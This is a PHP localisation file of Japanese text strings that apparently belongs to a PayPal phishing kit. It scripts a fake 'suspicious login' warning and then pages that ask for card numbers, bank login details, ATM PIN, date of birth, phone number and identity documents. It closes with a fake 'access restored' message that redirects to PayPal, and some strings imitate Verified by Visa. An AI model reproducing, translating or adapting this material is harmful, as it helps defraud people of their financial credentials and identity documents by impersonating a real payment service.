<?
$language = array(
    'suspecious' => array(
        '1' => 'あなたのアカウントを保護するため、私たちは定期的に不正な活動の可能性の証拠を探します…',
        '2' => 'あなたの安全は私たちの優先事項です。',
        '3' => 'あなたの最近のログイン元だったデバイスか位置が認識されなかったため、あなたの同一性を確認したいと思います。これがあなたのアカウントであることを確かめたいと思います。',
        '4' => 'Continue',
    ),
    'update'     => array(
        'navbar'     => array(
            '1' => '概要',
            '2' => '活動',
            '3' => '送金＆依頼',
            '4' => '財布',
            '5' => '店',
            '6' => 'ログアウト',
        ),
        'sub_navbar' => array(
            '1' => 'アカウント',
            '2' => 'セキュリティ',
            '3' => '支払い',
            '4' => '通知',
        ),
        '1'          => 'プロフィール',
        '2'          => '写真を更新',
        '3'          => '加入日',
        '4'          => '編集',
        '5'          => array(
            '1' => '認証されたログイン',
            '2' => 'クレジットカードを確認',
            '3' => '銀行アカウントを確認',
            '4' => '身分証明',
        ),
        '6'          => '住所',
        '7'          => 'メイン、請求先住所',
        '8'          => '確認',
    ),

    'vbv'        => array(
        'lines' => array(
            '1' => '追加のオンライン安全性',
            '2' => 'helps protect your',
            '3' => 'card against unauthorized use online - at no additional cost. To use',
            '4' => 'on this and futur purshases. complete this page You\'ll the create your own',
            '5' => 'Password',
        ),
        '1'     => '出品者',
        '2'     => '金額',
        '3'     => '日時',
        '4'     => 'カード番号',
        '5'     => 'カードの種類',
        '6'     => '銀行名',
        '7'     => 'カードに印字された名前',
        '8'     => '主カード保持者の生年月日',
        '9'     => '個人の電話番号',
    ),

    'bank'       => array(
        'navbar'     => array(
            '1' => '概要',
            '2' => '活動',
            '3' => '送金＆依頼',
            '4' => '財布',
            '5' => '店',
            '6' => 'ログアウト',
        ),
        'sub_navbar' => array(
            '1' => 'アカウント',
            '2' => 'セキュリティ',
            '3' => '支払い',
            '4' => '通知',
        ),
        '1'          => 'プロフィール',
        '2'          => '写真を更新',
        '3'          => '加入日',
        '4'          => '編集',
        '5'          => array(
            '1' => '認証されたログイン',
            '2' => '検証されたクレジットカード',
            '3' => '銀行アカウントを確認',
            '4' => '身分証明',
        ),
        '6'          => '銀行を選択',
        '7'          => '銀行アカウントをお持ちではありませんか？',
        '8'          => array(
            '1' => 'Use your',
            '2' => 'Bank (Personal) login to link your bank. We don\'t save this information.',
            '3' => 'By clicking',
            '4' => 'you agree to the',
            '5' => 'Terms and Conditions',
            '6' => 'for linking your bank.',
        ),
        '9'          => array(
            '1' => 'Use your',
            '2' => 'Bank details to link your bank. We don\'t save this information.',
        ),
        '10'         => '続けると、あなたは PayPal が2件の少額の預金と引き出しをすることに同意したことになります。',
        '11'         => '銀行アカウントを確認する最後のステップは ATM の PIN コードの提供です。これはあなたがアカウント所有者であると知るにはこのやりかたしかないためです。',
        '12'         => '私たちはこの情報を保存しません。',
        '13'         => 'セキュリティ質問への答えは何ですか？',
        '14'         => 'ATM の PIN コード',
        '15'         => 'このステップをスキップ',

    ),
    'identity'   => array(
        'navbar'     => array(
            '1' => '概要',
            '2' => '活動',
            '3' => '送金＆依頼',
            '4' => '財布',
            '5' => '店',
            '6' => 'ログアウト',
        ),
        'sub_navbar' => array(
            '1' => 'アカウント',
            '2' => 'セキュリティ',
            '3' => '支払い',
            '4' => '通知',
        ),
        '1'          => 'プロフィール',
        '2'          => '写真を更新',
        '3'          => '加入日',
        '4'          => '編集',
        '5'          => array(
            '1' => '認証されたログイン',
            '2' => '検証されたクレジットカード',
            '3' => '銀行アカウントを確認',
            '4' => '身分証明',
        ),
        '6'          => '身分証明',
        '7'          => 'ドラッグアンドドロップするかブラウズ…',
        '8'          => '身分証明書を現在お持ちではありませんか？',
    ),

    'thanks'     => array(
        'navbar'     => array(
            '1' => '概要',
            '2' => '活動',
            '3' => '送金＆依頼',
            '4' => '財布',
            '5' => '店',
            '6' => 'ログアウト',
        ),
        'content' => array(
            '1' => 'あなたのアカウントへのアクセスは完全に回復しました',
            '2' => 'アカウントへのアクセスを回復する手続きをお取りくださりありがとうございました。',
            '3' => 'あなたの忍耐と努力が私たちのユーザーコミュニティ全体の安全性を高めます。',
            '4' => 'PayPal はあなたのアカウント、ビジネス、財務データをあなたと同じように真剣に扱います。',
            '5' => 'そして、このような検査を私たちのシステムに対して続けることが高いレベルの安全性に寄与します。',
            '6' => 'あなたのアカウントは今後24時間以内に検証されます。',
            '7' => 'ログアウト',
            '8' => 'あなたの PayPal アカウントに10秒以内に転送されます。',
        ),
    ));
?>